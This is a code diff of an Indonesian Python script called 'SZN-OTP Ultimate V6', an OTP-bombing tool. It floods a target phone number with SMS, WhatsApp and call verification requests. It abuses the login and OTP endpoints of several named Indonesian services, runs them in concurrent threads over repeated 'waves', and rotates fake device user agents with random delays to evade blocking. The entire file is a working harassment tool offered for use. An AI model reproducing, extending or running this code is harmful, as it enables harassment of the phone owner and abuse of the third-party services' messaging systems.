@@ -1,112 +1,124 @@
 import requests
+import threading
 import time
 import random
 import os
+import sys
+from datetime import datetime
 
-# --- KONFIGURASI WARNA (Biar Terminal Gak Lawak) ---
-R = '\033[31m' # Merah
-G = '\033[32m' # Hijau
-Y = '\033[33m' # Kuning
-B = '\033[34m' # Biru
-C = '\033[36m' # Cyan
-W = '\033[37m' # Putih
+# --- WARNA MODEREN (BIAR GAK MINUS MATANYA) ---
+G = '\033[92m'  # Hijau Terang
+R = '\033[91m'  # Merah Terang
+Y = '\033[93m'  # Kuning
+B = '\033[94m'  # Biru
+C = '\033[96m'  # Cyan
+W = '\033[0m'   # Reset
 
-class UltimateSpammer:
+class SZN_AutoPilot_Engine:
     def __init__(self, target):
-        self.target = target
-        # List User-Agent biar gak kedeteksi bot yang sama terus
-        self.ua_list = [
-            "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
+        self.target_raw = target
+        self.target_intl = self.format_ke_intl(target) # Format +62
+        self.target_local = self.format_ke_local(target) # Format 08
+        self.success = 0
+        self.failed = 0
+        self.lock = threading.Lock()
+        
+        # DATABASE USER-AGENT (Nyamar jadi HP Flagship)
+        self.device_pool = [
+            "Samsung Galaxy S24 Ultra Build/UP1A.231005.007",
+            "iPhone 15 Pro Max; CPU iPhone OS 17_4 like Mac OS X",
+            "Google Pixel 8 Pro Build/UD1A.231105.004",
+            "Xiaomi 14 Pro; Android 14; HyperOS"
         ]
 
-    def get_headers(self):
+    def format_ke_intl(self, n):
+        n = n.replace("+", "").replace(" ", "").replace("-", "")
+        if n.startswith("08"): return "+62" + n[1:]
+        if n.startswith("8"): return "+62" + n
+        if n.startswith("62"): return "+" + n
+        return "+" + n
+
+    def format_ke_local(self, n):
+        n = n.replace("+", "").replace(" ", "").replace("-", "")
+        if n.startswith("62"): return "0" + n[2:]
+        if n.startswith("8"): return "0" + n
+        return n
+
+    def get_fake_headers(self):
         return {
-            'User-Agent': random.choice(self.ua_list),
+            'User-Agent': f"Mozilla/5.0 (Linux; Android 14; {random.choice(self.device_pool)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
             'Content-Type': 'application/json',
-            'Referer': 'https://google.com/',
-            'Accept': 'application/json'
+            'Referer': 'https://www.google.com/',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive'
         }
 
-    def spam_wa(self):
-        """Metode Spam WhatsApp (SkillAcademy & KreditPintar)"""
-        print(f"{C}[*] Sending WA OTP...{W}", end=" ", flush=True)
+    def execute_strike(self, api_name, url, payload_func):
+        """Mesin Eksekusi Peluru Otomatis"""
         try:
-            # Endpoint 1: Skill Academy
-            res = requests.post("https://dashboard.skillacademy.com/api/v1/auth/otp", 
-                               json={"phoneNumber": self.target}, headers=self.get_headers(), timeout=7)
-            if res.status_code == 200:
-                print(f"{G}SUCCESS [WA-1]{W}")
-            else:
-                # Fallback ke KreditPintar kalau gagal
-                res2 = requests.post("https://api.kreditpintar.com/v1/auth/otp", 
-                                    json={"phone": self.target, "category": "SIGN_IN"}, headers=self.get_headers(), timeout=7)
-                print(f"{G}SUCCESS [WA-2]{W}" if res2.status_code == 200 else f"{R}FAILED{W}")
-        except: print(f"{Y}TIMEOUT{W}")
+            payload = payload_func()
+            headers = self.get_fake_headers()
+            
+            # Request dengan timeout panjang biar gak gampang timeout
+            res = requests.post(url, json=payload, headers=headers, timeout=20)
+            
+            with self.lock:
+                status = f"{G}SUCCESS{W}" if res.status_code in [200, 201] else f"{R}FAIL ({res.status_code}){W}"
+                if "SUCCESS" in status: self.success += 1
+                else: self.failed += 1
+                print(f"[{datetime.now().strftime('%H:%M:%S')}] {C}{api_name:15}{W} => {status}")
+        except:
+            with self.lock:
+                self.failed += 1
+                print(f"[{datetime.now().strftime('%H:%M:%S')}] {Y}{api_name:15}{W} => {R}TIMEOUT/BLOCK{W}")
 
-    def spam_sms(self):
-        """Metode Spam SMS OTP (Matahari & Alodokter Login)"""
-        print(f"{C}[*] Sending SMS OTP...{W}", end=" ", flush=True)
-        try:
-            # API Matahari
-            res = requests.post("https://api.matahari.com/v1/auth/otp", 
-                               json={"phone": self.target, "type": "register"}, headers=self.get_headers(), timeout=7)
-            if res.status_code == 200:
-                print(f"{G}SUCCESS [SMS-1]{W}")
-            else:
-                # Fallback API Alodokter Login
-                res2 = requests.post("https://api.alodokter.com/v1/auth/login", 
-                                    json={"phone": self.target}, headers=self.get_headers(), timeout=7)
-                print(f"{G}SUCCESS [SMS-2]{W}" if res2.status_code == 200 else f"{R}FAILED{W}")
-        except: print(f"{Y}TIMEOUT{W}")
+    def start_storm(self, wave_count):
+        # DAFTAR API TERPILIH (SMS, WA, CALL)
+        api_list = [
+            ("WA-SKILL-ACA", "https://dashboard.skillacademy.com/api/v1/auth/otp", lambda: {"phoneNumber": self.target_local}),
+            ("SMS-MATAHARI", "https://api.matahari.com/v1/auth/otp", lambda: {"phone": self.target_local, "type": "register"}),
+            ("CALL-ALODOK", "https://api.alodokter.com/v1/auth/otp_call", lambda: {"phone": self.target_local}),
+            ("WA-KREDIT-PT", "https://api.kreditpintar.com/v1/auth/otp", lambda: {"phone": self.target_local, "category": "SIGN_IN"})
+        ]
 
-    def spam_call(self):
-        """Metode Spam Call OTP (KlikDokter / Alodokter Call)"""
-        print(f"{C}[*] Requesting CALL...{W}", end=" ", flush=True)
-        try:
-            # API Alodokter Call
-            res = requests.post("https://api.alodokter.com/v1/auth/otp_call", 
-                               json={"phone": self.target}, headers=self.get_headers(), timeout=7)
-            print(f"{G}SUCCESS [CALL]{W}" if res.status_code == 200 else f"{R}FAILED{W}")
-        except: print(f"{Y}TIMEOUT{W}")
+        for w in range(wave_count):
+            print(f"\n{B}>>> MENGIRIM GELOMBANG KE-{w+1} <<<{W}")
+            threads = []
+            for name, url, p_func in api_list:
+                t = threading.Thread(target=self.execute_strike, args=(name, url, p_func))
+                threads.append(t)
+                t.start()
+            
+            for t in threads: t.join()
+            
+            # SMART AUTO-DELAY (Rahasia Anti-Banned)
+            jeda = random.uniform(4.0, 8.5)
+            print(f"{Y}[!] Cooling system: {jeda:.2f} detik...{W}")
+            time.sleep(jeda)
 
-def banner():
+def display_banner():
     os.system('clear')
-    print(f"""{Y}
-    ╔════════════════════════════════════════╗
-    ║      SZN-OTP ULTIMATE V6 REBORN        ║
-    ║   {W}Status: {G}High Bypass Mode Enabled      {Y}║
-    ╚════════════════════════════════════════╝{W}
-    """)
-
-def main():
-    banner()
-    target = input(f"{B}[?] Target (8xxx): {W}")
-    # Auto-fix nomor kalau depannya masih 08 atau 62
-    if target.startswith('0'): target = target[1:]
-    elif target.startswith('62'): target = target[2:]
-    
-    nomor_final = "0" + target # Standar lokal 08xxx
-    
-    rounds = int(input(f"{B}[?] Jumlah Bom: {W}"))
-    delay = int(input(f"{B}[?] Jeda (detik): {W}"))
-
-    bot = UltimateSpammer(nomor_final)
-
-    for i in range(rounds):
-        print(f"\n{Y}[ Putaran ke-{i+1} ]{W}")
-        bot.spam_wa()
-        bot.spam_sms()
-        bot.spam_call()
-        
-        if i < rounds - 1:
-            print(f"\n{C}[!] Menunggu jeda {delay} detik...{W}")
-            time.sleep(delay)
+    print(f"""{C}
+    ╔══════════════════════════════════════════════════╗
+    ║   {G}SZN-OTP ULTIMATE V6 {W}- {R}AUTO-PILOT BRUTAL MODE{C}   ║
+    ║   {W}Target Intl: {Y}+62-8xxx {W}| {W}Engine: {G}Multi-Threaded{C}   ║
+    ╚══════════════════════════════════════════════════╝{W}""")
 
 if __name__ == "__main__":
+    display_banner()
+    num = input(f"{B}[?] Input Target (Contoh: 0896xxx): {W}")
+    bot = SZN_AutoPilot_Engine(num)
+    
+    print(f"{G}[+] Target Terkunci: {bot.target_intl}{W}")
+    gelombang = int(input(f"{B}[?] Jumlah Serangan (Wave): {W}"))
+    
+    print(f"\n{R}[WARNING] SERANGAN DIMULAI! SI SANZ BAKAL PANAS...{W}")
     try:
-        main()
+        bot.start_storm(gelombang)
     except KeyboardInterrupt:
-        print(f"\n{R}[!] Berhenti dipaksa!{W}")
-                                     
+        print(f"\n{R}[!] Serangan Dihentikan Paksa oleh User.{W}")
+    
+    print(f"\n{C}═══ [ RINGKASAN SERANGAN ] ═══")
+    print(f"{G}BERHASIL : {bot.success}")
+    print(f"{R}GAGAL    : {bot.failed}{W}")
+        
